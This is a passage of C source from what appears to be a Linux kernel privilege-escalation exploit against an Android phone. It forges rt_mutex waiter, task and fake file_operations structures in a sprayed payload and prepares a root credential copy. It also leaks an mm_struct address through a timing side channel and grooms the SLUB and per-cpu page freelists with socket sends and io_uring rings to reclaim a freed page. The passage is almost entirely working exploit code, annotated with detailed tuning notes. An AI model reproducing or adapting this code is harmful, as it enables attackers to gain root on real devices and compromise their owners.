     * TWO-NODE default: W0.pi black root → W1@SCRATCH classic gadget.
     * MODE4_MAIN_TREE: write on main; PI 1,0,0.
     * Single-node classic/legacy: gadget fields on W0.pi only. */
    if (mode4_two_node) {
      /* ---- Node W0 (waiter @ W0_OFF): clean black PI root ---- */
      put64(p, W0_OFF + 0x00, 1); /* main tree: inert black leaf */
      put64(p, W0_OFF + 0x08, 0);
      put64(p, W0_OFF + 0x10, 0);
      /* W0.pi @ +0x18: __rb_parent_color=1 (BLACK, parent NULL) */
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 1);
      /* rb_right → W1 (SCRATCH rb_node) */
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, w1_node);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, 0);
      /* ---- Node W1 (pure rb_node @ SCRATCH): classic MISC-8 gadget ---- */
      put64(p, SCRATCH_OFF + 0x00, write_pc);    /* MISC-8, RED */
      put64(p, SCRATCH_OFF + 0x08, write_right); /* fake_fops */
      put64(p, SCRATCH_OFF + 0x10, write_left);  /* 0 */
    } else if (mode4_main_tree) {
      put64(p, W0_OFF + 0x00, write_pc);
      put64(p, W0_OFF + 0x08, write_right);
      put64(p, W0_OFF + 0x10, write_left);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 1);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, 0);
    } else {
      put64(p, W0_OFF + 0x00, 1);
      put64(p, W0_OFF + 0x08, 0);
      put64(p, W0_OFF + 0x10, 0);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    }
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
    /*
     * Prio games vs stack prio=1 (rt: lower number = higher priority):
     *  A CLASSIC_MAPPED / A53: W0=100 → stack on right of W0 → not top.
     *  B PI_CLASSIC:         W0=200 → stack even more clearly preferred top
     *    for PI erase of stack.pi_tree (erase target B).
     *  Default plateau: FAKE_WAITER_PRIO.
     */
    if (env_flag("MODE4_TOP_PI", 0) || env_flag("MODE4_TOP_LEFT", 0))
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, 250);
    else if (env_flag("MODE4_ARISTOTLE", 0) ||
             env_flag("MODE4_WRITE_PROOF", 0) ||
             env_flag("MODE4_CLASSIC_SAFE", 0) ||
             env_flag("MODE4_CLASSIC_NOP", 0) ||
             env_flag("MODE4_ZERO_NAME", 0) ||
             env_flag("MODE4_ZERO_OWNER", 0) ||
             env_flag("MODE4_CHAIN", 0) ||
             env_flag("MODE4_ZI", 0) ||
             env_flag("MODE4_ZIO", 0) ||
             env_flag("MODE4_WION", 0) ||
             env_flag("MODE4_WAITLOCK0", 0) ||
             env_flag("MODE4_ION_SAFE", 0) ||
             env_flag("MODE4_ION_ROOT", 0) ||
             env_flag("MODE4_ROOT_SPRAY", 0) ||
             env_flag("MODE4_LOCK_OWNER0", 0))
      /* Stack prio=200; W0 must stay top after re-enqueue (lower prio number). */
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, 100);
    else if (env_flag("MODE4_PI_CLASSIC", 0) ||
             env_flag("MODE4_REF_LEFT", 0) ||
             env_flag("MODE4_REF_LEFT_PI", 0))
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, 200);
    else if (env_flag("MODE4_EXP_F", 0))
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, 200);
    else if (env_flag("MODE4_A53_STAMP", 0) ||
             env_flag("MODE4_CLASSIC_MAPPED", 0) ||
             env_flag("MODE4_CLASSIC_LEAF", 0) ||
             env_flag("MODE4_EXP_E", 0) ||
             env_flag("MODE4_EXP_E2", 0) ||
             env_flag("MODE4_ION_FOPS", 0) ||
             env_flag("MODE4_EXP_N", 0) ||
             env_flag("MODE4_ION_ROOT", 0))
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, 100);
    else
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    /*
     * EXP_E: SCRATCH = inert black rb_node used as stack main parent_color.
     * If only-right erase runs, change_child may store fake_fops into
     * SCRATCH+8 or SCRATCH+16 (not ashmem_misc — probe only).
     */
    if (env_flag("MODE4_EXP_E", 0)) {
      put64(p, SCRATCH_OFF + 0x00, 1); /* __rb_parent_color black/null */
      put64(p, SCRATCH_OFF + 0x08, 0);
      put64(p, SCRATCH_OFF + 0x10, 0);
      if (chunk == 0 && payload_mode == PAGE_PAYLOAD_FOPS)
        pr_info("mode4 EXP_E SCRATCH@+%x inert parent node (spray)\n",
                (unsigned)SCRATCH_OFF);
    }
    if (chunk == 0 && payload_mode == PAGE_PAYLOAD_FOPS) {
      if (env_flag("MODE4_TOP_PI", 0))
        pr_info("mode4 W0 prio=250 (TOP_PI C: stack prio=0 max top prefer)\n");
      else if (env_flag("MODE4_PI_CLASSIC", 0))
        pr_info("mode4 W0 prio=200 (PI_CLASSIC B: stack prio=1 prefers top)\n");
      else if (env_flag("MODE4_EXP_F", 0))
        pr_info("mode4 W0 prio=200 (EXP_F adjust_pi path; stack prio=90)\n");
      else if (env_flag("MODE4_EXP_E2", 0))
        pr_info("mode4 W0 prio=100 (EXP_E2 inverted *MISC=fake_fops)\n");
      else if (env_flag("MODE4_EXP_E", 0))
        pr_info("mode4 W0 prio=100 (EXP_E non-MISC main classic)\n");
      else if (env_flag("MODE4_A53_STAMP", 0) ||
               env_flag("MODE4_CLASSIC_MAPPED", 0))
        pr_info("mode4 W0 prio=100 (CLASSIC_MAPPED A / A53)\n");
    }
#else
    if (mode4_main_tree) {
      put64(p, W0_OFF + 0x00, write_pc);
      put64(p, W0_OFF + 0x08, write_right);
      put64(p, W0_OFF + 0x10, write_left);
      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 1);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, 0);
    } else {
      put64(p, W0_OFF + 0x00, 1);
      put64(p, W0_OFF + 0x08, 0);
      put64(p, W0_OFF + 0x10, 0);
      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    }
    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
#endif

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    /*
     * Proven-safe scheduler flags for fake_task as rt_mutex owner (CPH2521
     * disasm + t0_last survive). Do NOT bulk-zero 0x100–0x500 (kills se/mm).
     * on_rq@0x80: non-zero → setprio dequeue_task softboot.
     * policy@0x60: SCHED_NORMAL so class path is normal (not RT garbage).
     */
    put32(p, FAKE_TASK_OFF + 0x80, 0); /* on_rq = 0 */
    put32(p, FAKE_TASK_OFF + 0x60, 0); /* policy = SCHED_NORMAL */
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, 0);
    if (chunk == 0 && payload_mode == PAGE_PAYLOAD_FOPS)
      pr_info("fake_task on_rq@0x80=0 policy@0x60=0 pi_blocked=0 pi_top=0 "
              "(setprio-safe baseline)\n");

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      /*
       * CPH2521: default pi_waiters=0 (closest plateau). Linking any node under
       * fake_task.pi_waiters softboots at select — even W0.pi=1,0,0.
       * Opt-in only: MODE4_PI_WAITERS=1 (experiment).
       */
      char *ng = getenv("MODE4_NO_GADGET");
      char *pi_off = getenv("MODE4_PI_WAITERS");
      int want_pi = 0;
      if ((pi_off && pi_off[0] == '1') ||
          env_flag("MODE4_JOINCHANG", 0))
        want_pi = 1;
      (void)ng;
      if (want_pi) {
        uintptr_t node = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
        char *legacy_shell = getenv("MODE4_LEGACY_INVERT");
        int use_fops_shell =
            legacy_shell && legacy_shell[0] == '1' && !mode4_two_node &&
            !mode4_classic;
        if (use_fops_shell) {
          /*
           * Legacy invert only: root = fake_fops shell, leftmost = W0.pi.
           * Shell fields filled after put_fake_fops_table (below).
           */
          put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, fake_fops);
          put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, node);
          if (chunk == 0)
            pr_info("mode4 pi_waiters root=fake_fops shell leftmost=W0.pi "
                    "(%016zx / %016zx)\n",
                    fake_fops, node);
        } else {
          /*
           * Default / no-gadget / two-node / classic:
           * root = leftmost = W0.pi (never treat raw fops as rb root).
           */
          put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, node);
          put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, node);
          if (chunk == 0)
            pr_info("mode4 pi_waiters root=leftmost=W0.pi (%016zx)%s\n",
                    node,
                    mode4_two_node ? " [two-node→W1]"
                    : (mode4_classic ? " [classic]" : " [W0.pi only]"));
        }
      } else {
        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
      }
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
      /*
       * RED_FAKE / MAIN_TREE / default: treat start of fake_fops as rb_node
       * parent so tree walk + __rb_change_child stay consistent:
       *   +0x08 rb_right → erased node (W0 main or W0.pi)
       * change_child then replaces rb_right with MISC; *MISC gets parent_color.
       */
      /*
       * Consistent invert: first 0x18 of fake_fops is black root shell linking
       * to W0.pi; open@0x70+ remains for post-redirect. After erase of W0,
       * shell.rb_right becomes MISC (harmless until repair_llseek).
       */
      /* Opt-in only: MODE4_FOPS_SHELL=1 overlays rb shell on fake_fops[0:0x18].
       * Default leaves pure fops table (open@0x70) for post-redirect. */
      if (pselect_custom_write == 4 && env_flag("MODE4_FOPS_SHELL", 0) &&
          !mode4_classic && !mode4_two_node) {
        uintptr_t node = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
        put64(p, FOPS_TABLE_OFF + 0x00, 1);
        put64(p, FOPS_TABLE_OFF + 0x08, node);
        put64(p, FOPS_TABLE_OFF + 0x10, 0);
        if (chunk == 0)
          pr_info("mode4 shell@fake_fops pc=1 right=W0.pi left=0 (opt-in)\n");
      }
      if (pselect_custom_write >= 2 || env_flag("MODE4_SLIDE_CRED", 0) ||
          env_flag("MODE4_UID0", 0)) {
        fill_init_cred_copy(p, CRED_COPY_OFF);
        if (chunk == 0) {
          g_cred_copy = payload_base + CRED_COPY_OFF;
          pr_info("cred_copy=%016zx (spray; W2 VALUE, not init_cred)\n",
                  g_cred_copy);
        }
      }
    }
  }
  /*
   * COPYA: duplicate the frag-region structure cluster (chunk-0 at
   * skb_buf[0xE80..0x1380)) into the linear region [0..0x500). The sends'
   * kmalloc-4096 linear heads are order-0 claims too — any linear object
   * landing at base carries the walk geometry at identical base-derived
   * offsets (lock@+0 table@+0x100 W0@+0x300 task@+0x400).
   */
  if (payload_mode == PAGE_PAYLOAD_FOPS && env_flag("COPYA", 1)) {
    memcpy(skb_buf, skb_buf + 0xE80, 0x500);
  }

  return 1;
}


/* SLABINFO=1: snapshot mm_struct SLUB state at phase boundaries (QEMU has
 * /proc + /sys; on-device /sys/kernel/slab may be absent — prints skip). */
static void slab_state_snap(const char *tag) {
  if (!env_flag("SLABINFO", 0))
    return;
  char b[256];
  read_first_line("/sys/kernel/slab/mm_struct/slabs_cpu_partial", b, sizeof(b));
  pr_info("SLAB[%s] cpu_partial=%s", tag, b);
  read_first_line("/sys/kernel/slab/mm_struct/partial", b, sizeof(b));
  pr_info("SLAB[%s] node_partial=%s", tag, b);
  read_first_line("/sys/kernel/slab/mm_struct/slabs", b, sizeof(b));
  pr_info("SLAB[%s] slabs=%s", tag, b);
  read_first_line("/sys/kernel/slab/mm_struct/objects_partial", b, sizeof(b));
  pr_info("SLAB[%s] objspartial=%s", tag, b);
}

uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  unmovable_pre_drain();

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  SYSCHK(waitpid(child_leak, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  last_mm_struct = leaked;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  /*
   * Z7: KS returned 0xffffff8780e90000 (inside the 64GB DIRECT_MAP
   * window, past real DRAM). Punch SOFTBOOT'd. Z4/Z6 parks lived on
   * 0xffffff80xxxxxxxx (P0 of DRAM, ≤16GB from PAGE_OFFSET).
   */
  if (base < P0_PAGE_OFFSET ||
      base >= (P0_PAGE_OFFSET + 0x400000000ULL)) {
    pr_warning("KernelSnitch mm %016zx outside P0 DRAM window — retry\n",
               base);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
  if (!prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = env_int_range("SNDBUF_KB", 1024, 64, 65536) * 1024;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  /*
   * SO_SNDBUF is clamped to net.core.wmem_max (~208KB stock) — that caps
   * buffered reclaim sends at ~4. SO_SNDBUFFORCE bypasses the clamp but
   * needs CAP_NET_ADMIN (QEMU initramfs root ✓, device shell ✗ — on
   * device use RECLAIM_SOCKETS to aggregate quota instead).
   */
  {
    int actual = 0;
    socklen_t alen = sizeof(actual);
    getsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &actual, &alen);
    if (actual < sndbuf) {
      if (setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUFFORCE, &sndbuf,
                     sizeof(sndbuf)) == 0) {
        pr_info("reclaim SO_SNDBUFFORCE=%d ok\n", sndbuf);
      } else {
        pr_info("reclaim SO_SNDBUFFORCE failed errno=%d (actual=%d)\n",
                errno, actual);
      }
    }
  }
  /*
   * RECLAIM_SOCKETS: extra socketpairs so total buffered volume and
   * per-socket page_frag caches multiply; each send goes round-robin.
   */
  int reclaim_socks = env_int_range("RECLAIM_SOCKETS", 1, 1, 32);
  int rsocks[MAX_RECLAIM_SOCKETS];
  int n_socks = 1;
  rsocks[0] = reclaim_sv[0];
  for (int s = 1; s < reclaim_socks && s < MAX_RECLAIM_SOCKETS; s++) {
    int pair[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, pair) != 0)
      break;
    setsockopt(pair[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    setsockopt(pair[0], SOL_SOCKET, SO_SNDBUFFORCE, &sndbuf,
               sizeof(sndbuf));
    int fl = fcntl(pair[0], F_GETFL, 0);
    if (fl >= 0)
      fcntl(pair[0], F_SETFL, fl | O_NONBLOCK);
    rsocks[n_socks++] = pair[0];
  }
  if (n_socks > 1)
    pr_info("reclaim sockets=%d (sndbuf %d each)\n", n_socks, sndbuf);
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  /*
   * Reclaim sends use ORDER-2-SIZED chunks (default 0x4E80), NOT the full
   * 32KB: unix_stream_sendmsg() (5.10.236 source) splits a send into
   * linear SKB_MAX_HEAD(0) (~0xE80) + PAGE_ALIGN'd page frags. A 32KB send
   * is 100% order-3 frags — which can NEVER claim a lone freed order-2 mm
   * slab page (an order-3 request needs a buddy-merged block). A 0x4E80
   * send = linear 0xE80 + ONE order-2 frag page carrying the payload
   * (table at payload 0xF80 -> frag_page+0x100, the IonStack -0xE80
   * geometry). Each send claims one order-2 page directly from the
   * order-2 freelist (LIFO: our just-freed mm page is freshest).
   * Env: RECLAIM_SEND_SIZE (bytes), RECLAIM_SENDS (count).
   */
  struct iovec riov;
  memset(&riov, 0, sizeof(riov));
  riov.iov_base = skb_buf;
  riov.iov_len = (size_t)env_int_range("RECLAIM_SEND_SIZE", 0x4E80, 0x1100,
                                       SKB_SEND_SIZE);
  struct msghdr rmsg;
  memset(&rmsg, 0, sizeof(rmsg));
  rmsg.msg_iov = &riov;
  rmsg.msg_iovlen = 1;
  int reclaim_sends =
      env_int_range("RECLAIM_SENDS", SKB_RECLAIM_SENDS, 1, 1024);

  pin_to_core(g_core_sel);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();

  /*
   * MM_CHURN: on 5.10.236 the emptied mm page lands on the SLUB per-cpu
   * partial list (cpu_partial≈13 for 0x3c0 objects) and never reaches the
   * buddy — the reclaim frags claim unrelated pages instead (QEMU-verified:
   * 14 payload pages bracketing but skipping the leaked base). Choreography:
   * (1) fork holder pairs NOW — their mm allocations drain the partial
   *     lists so the chain is empty when the closes start;
   * (2) the closes free base's page → it becomes the OLDEST chain entry;
   * (3) killing the holder pairs afterwards adds one empty page per pair;
   *     past cpu_partial the chain spills (unfreeze_partials) discarding
   *     empty slabs oldest-LAST → base is the FRESHEST order-2 page on the
   *     PCP freelist → reclaim send #1 claims it.
   */

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  /*
   * CLOSE ORDER (QEMU SLUB-measured, cpu_partial=13, node starts 0):
   * memfd_leak FIRST so base empties before the batch — put_cpu_partial
   * prepends, so base lands at the chain TAIL (oldest). Then close ALL
   * pre/post/spray memfds so ≥14 pages empty → the chain overflows →
   * unfreeze_partials walks head(newest)→tail(base): the 5 newest park on
   * node partial, everything older is DISCARDED to the buddy — base last
   * = FRESHEST order-2 free = first split by the order-0 frag storm.
   * (Old order closed memfd_leak LAST → base was head → parked, never
   * discarded — the whole placement failure. Shaping socket closes FIRST
   * so its skb noise precedes the discard.)
   */
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }
  /*
   * +2 distinct prepare pages (children 0 and 16 — different slabs) push
   * the chain past cpu_partial(13): spill → 5 newest park on node, the
   * older ~10 DISCARD — base (freed first = chain tail) walks LAST =
   * freshest order-2 in the buddy. Two exits ≈ 14 order-0 noise pages —
   * PCP absorbs them ahead of the split, sends cover the rest.
   */
  for (int k = 0; k < 6; k++) {
    size_t idx = (size_t)k * mm_objs_per_slab;
    if (idx >= prepare_ctx.mm_cnt)
      break;
    kill_child(prepare_ctx.childs[idx]);
    if (prepare_ctx.memfds[idx] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[idx]));
      prepare_ctx.memfds[idx] = -1;
    }
  }
  sched_yield();
  sched_yield();
  slab_state_snap("after_closes");
  if (env_flag("RSP_HALT", 0)) {
    pr_info("RSP_HALT: halting after closes\n");
    rsp_halt_after_closes();
  }
  /*
   * IMMEDIATE PCP claim (the fix): at the close moment base's page sits
   * on the per-cpu ORDER-2 PCP LIST (QEMU struct-page read: flags=0, no
   * PG_buddy, lru linked to neighbour pages) - the Android high-order
   * PCP backport catches every order-2 free BEFORE the buddy. io_uring
   * rings claim from the same PCP, so a TIGHT back-to-back payload-
   * stamped ring burst right here (no sleeps, nothing between) takes
   * base while it is still on the PCP. Packet rings (QEMU/caps) after.
   */
  /* rings moved to the END: base's page is STILL SLUB-frozen at the
   * closes (QEMU chain walk: self-linked lru) — it only discards after
   * the late frees below. Claim AFTER everything is freed. */

  int churn_count = env_int_range("MM_CHURN", 0, 0, 1024);
  pid_t *churn_pids = NULL;
  if (churn_count > 0) {
    churn_pids = calloc((size_t)churn_count, sizeof(pid_t));
    for (int i = 0; i < churn_count; i++) {
      churn_pids[i] = clone_child();
    }
    pr_info("MM_CHURN forked %d holders (~%d pages)\n", churn_count,
            churn_count / 16);
    slab_state_snap("after_churn_fork");
  }
  if (churn_pids) {
    for (int i = 0; i < churn_count; i++) {
      sched_yield();
    }
    free(churn_pids);
    churn_pids = NULL;
    pr_info("MM_CHURN killed holders (partial spill → base freshest)\n");
    slab_state_snap("after_churn_kill");
  }
  /*
   * RECLAIM_DELAY_MS: mm_struct frees are RCU/mmdrop-deferred; if the
   * reclaim sends fire before the target page reaches the PCP freelist,
   * the frag grabs an unrelated page (QEMU TCG is especially slow at
   * quiescing). Small delay lets the frees land while the (idle) freelist
   * head still holds our page.
   */
  {
    int rdelay = env_int_range("RECLAIM_DELAY_MS", 0, 0, 2000);
    if (rdelay > 0) {
      usleep((useconds_t)rdelay * 1000);
      sched_yield();
    }
  }
  for (int i = 0; i < reclaim_sends; i++) {
    errno = 0;
    ssize_t sent = sendmsg(rsocks[i % n_socks], &rmsg, MSG_DONTWAIT);
    if (sent <= 0) {
      break;
    }
  }
  slab_state_snap("after_sends");
  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
      prepare_ctx.memfds[i] = -1;
      kill_child(prepare_ctx.childs[i]);
    }
  }
  sched_yield();
  sched_yield();

  /*
   * INTERLEAVED RECLAIM (the race fix): the old cycle (kill-all-56 then
   * rings) left base stealable in the buddy for SECONDS — mm pages free
   * as their LAST object dies (random order in the kill wave), and any
   * cpu can take them from the buddy before the burst. Interleave: kill
   * KILL_BATCH children, IMMEDIATELY claim RING_BATCH rings, repeat. A
   * page that empties is claimed within ~batch-microseconds while it
   * still sits at the PCP head. Rings stamp + register normally.
   */
  {
    int cycles = env_int_range("RECLAIM_CYCLES", 3, 1, 8);
    int total_holders = env_int_range("FINAL_TURNOVER", 224, 0, 1024);
    int kill_batch = env_int_range("KILL_BATCH", 4, 1, 64);
    int ring_batch = env_int_range("RING_BATCH", 8, 1, 128);
    int per_cycle = total_holders / cycles;
    for (int c = 0; c < cycles; c++) {
      slab_state_snap("before_rings");
      if (c == 0 && env_flag("RSP_HALT2", 0)) {
        pr_info("RSP_HALT2: halting before rings\n");
        rsp_halt_after_closes();
      }
      if (per_cycle > 0) {
        pid_t *tids = calloc((size_t)per_cycle, sizeof(pid_t));
        int n = 0;
        for (int i = 0; i < per_cycle; i++) {
          tids[i] = clone_child();
          if (tids[i] > 0)
            n++;
        }
        int killed = 0;
        while (killed < n) {
          int k = kill_batch;
          if (killed + k > n)
            k = n - killed;
          for (int i = 0; i < k; i++) {
            kill_child(tids[killed + i]);
          }
          killed += k;
          /* immediate claim burst, drained across ALL cpus */
          cpu_hop_claims(skb_buf, 0x500, ring_batch);
        }
        free(tids);
        sched_yield();
        sched_yield();
      }
      /* cycle-final: hop sweep + packet rings (QEMU/caps) */
      cpu_hop_claims(skb_buf, 0x500, 64);
      packet_ring_reclaim(skb_buf, 0x500);
      pr_info("RECLAIM_CYCLE %d/%d done (interleaved %dx%d/%d)\n",
              c + 1, cycles, kill_batch, ring_batch, per_cycle);
    }
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    /* Closest plateau used ≤12; raise with FOPS_MAX_ATTEMPTS=N if KS flaky. */
